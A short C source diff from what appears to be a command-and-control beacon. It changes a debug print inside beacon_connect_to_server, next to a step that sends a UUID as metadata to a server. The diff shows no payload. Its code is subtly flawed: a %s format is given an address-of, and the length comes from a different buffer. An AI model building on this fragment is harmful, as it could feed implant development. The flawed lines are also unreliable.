@@ -70,7 +70,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
 
     //// Send metadata
     
-    printf("\n%s\n", UUID_BUFFER);
+    printf("\n%s\n", &UUID_BUFFER);
     send_all(s, UUID_BUFFER, (int)strlen(sendbuf)); 
     printf("\nSENDBUF\n");
   
